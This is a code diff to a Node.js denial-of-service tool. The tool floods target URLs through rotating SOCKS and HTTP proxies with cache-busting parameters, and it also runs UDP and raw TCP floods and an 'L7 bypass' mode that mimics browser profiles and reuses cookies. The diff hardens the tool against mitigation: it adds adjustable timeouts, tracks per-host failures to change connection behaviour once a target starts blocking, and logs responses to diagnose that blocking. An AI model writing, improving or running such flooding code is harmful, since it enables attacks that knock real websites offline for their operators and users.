@@ -20,8 +20,9 @@ const USE_CLUSTER = process.env.USE_CLUSTER === "true";
 
 // ===================== SHARED CONFIG =====================
 const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
-const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
+const numThreads = parseInt(process.env.MAX_THREADS, 10) || 500;
 const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
+const REQUEST_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 10000;
 const USE_UDP = process.env.UDP_FLOOD !== "false";
 const USE_RAW_TCP = process.env.RAW_TCP !== "false";
 const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
@@ -234,13 +235,24 @@ function rawTCPFlood(host, port, threadId) {
   return () => sent;
 }
 
-function socksRequest(url, agent) {
+function socksRequest(url, agent, threadId) {
   return new Promise((resolve) => {
-    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: 5000, rejectUnauthorized: false }, (res) => {
+    const start = Date.now();
+    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: REQUEST_TIMEOUT, rejectUnauthorized: false }, (res) => {
       res.resume();
+      // Log non-200 status codes occasionally for diagnostics
+      if (res.statusCode !== 200 && Math.random() < 0.01) {
+        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
+      }
       resolve({ status: res.statusCode });
     });
-    req.on("error", () => resolve(null));
+    req.on("error", (err) => {
+      // Log connection errors occasionally to help diagnose blocking
+      if (Math.random() < 0.005) {
+        try { console.error(colors.red(`[${new Date().toLocaleTimeString()}] [socks] ${url} → ${err.code || err.message}`)); } catch {}
+      }
+      resolve(null);
+    });
     req.on("timeout", () => { req.destroy(); resolve(null); });
     req.end();
   });
@@ -256,9 +268,14 @@ function createContext(proxyLine) {
   return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
 }
 
-const fireHTTPRequest = (url, ctx) => {
+// Track consecutive failures per host to detect blocking/rate-limiting
+const hostFailureCount = new Map();
+
+const fireHTTPRequest = (url, ctx, threadId) => {
   return new Promise((resolve) => {
+    const start = Date.now();
     const parsedUrl = new URL(url);
+    const host = parsedUrl.hostname;
     // Pick a browser agent for L7 bypass direct HTTPS
     let agent;
     let profileData = null;
@@ -271,26 +288,49 @@ const fireHTTPRequest = (url, ctx) => {
     const headers = getNoCacheHeaders(profileData ? profileData.profile : null);
     // Attach stored cookies for session persistence
     if (L7_BYPASS) {
-      const cookies = getCookies(parsedUrl.hostname);
+      const cookies = getCookies(host);
       if (cookies) headers["Cookie"] = cookies;
     }
+    // Auto-switch to Connection: close when keep-alive connections go stale
+    const failCount = hostFailureCount.get(host) || 0;
+    if (failCount > 10) {
+      headers["Connection"] = "close";
+    }
     const options = {
-      hostname: parsedUrl.hostname,
+      hostname: host,
       port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
       path: parsedUrl.pathname + parsedUrl.search,
       method: "GET",
       headers,
       agent,
-      timeout: 5000,
+      timeout: REQUEST_TIMEOUT,
       rejectUnauthorized: false,
     };
     const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
-      if (L7_BYPASS && res.headers) storeCookies(parsedUrl.hostname, res.headers);
+      // Reset failure count on successful response
+      if (hostFailureCount.has(host)) hostFailureCount.delete(host);
+      if (L7_BYPASS && res.headers) storeCookies(host, res.headers);
       res.resume();
+      // Log non-200 status codes occasionally for diagnostics
+      if (res.statusCode !== 200 && Math.random() < 0.005) {
+        try { console.error(colors.gray(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${res.statusCode} (${Date.now()-start}ms)`)); } catch {}
+      }
       resolve({ status: res.statusCode });
     });
-    req.on("error", () => resolve(null));
-    req.on("timeout", () => { req.destroy(); resolve(null); });
+    req.on("error", (err) => {
+      // Track consecutive failures per host for connection mgmt
+      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
+      // Log connection errors occasionally to help diagnose blocking
+      if (Math.random() < 0.005) {
+        try { console.error(colors.yellow(`[${new Date().toLocaleTimeString()}] [t${threadId}] ${url} → ${err.code || err.message}`)); } catch {}
+      }
+      resolve(null);
+    });
+    req.on("timeout", () => {
+      hostFailureCount.set(host, (hostFailureCount.get(host) || 0) + 1);
+      req.destroy();
+      resolve(null);
+    });
     req.end();
   });
 };
@@ -327,17 +367,17 @@ if (USE_CLUSTER && cluster.isWorker) {
         const cb = generateCacheBuster();
         const sep = target.url.includes("?") ? "&" : "?";
         const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
-        if (ctx.type === "socks") {
-          promises.push(socksRequest(url, ctx.agent));
-        } else if (ctx.type === "http") {
-          promises.push(
-            urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(5000) })
-              .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
-              .catch(() => null)
-          );
-        } else {
-          promises.push(fireHTTPRequest(url, ctx));
-        }
+      if (ctx.type === "socks") {
+        promises.push(socksRequest(url, ctx.agent, threadId));
+      } else if (ctx.type === "http") {
+        promises.push(
+          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
+            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
+            .catch(() => null)
+        );
+      } else {
+        promises.push(fireHTTPRequest(url, ctx, threadId));
+      }
       }
 
       let successfulRequests = 0;
@@ -721,15 +761,15 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
       const sep = target.url.includes("?") ? "&" : "?";
       const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
       if (ctx.type === "socks") {
-        promises.push(socksRequest(url, ctx.agent));
+        promises.push(socksRequest(url, ctx.agent, threadId));
       } else if (ctx.type === "http") {
         promises.push(
-          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
+          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(REQUEST_TIMEOUT) })
             .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
             .catch(() => null)
         );
       } else {
-        promises.push(fireHTTPRequest(url, ctx));
+        promises.push(fireHTTPRequest(url, ctx, threadId));
       }
     }
 
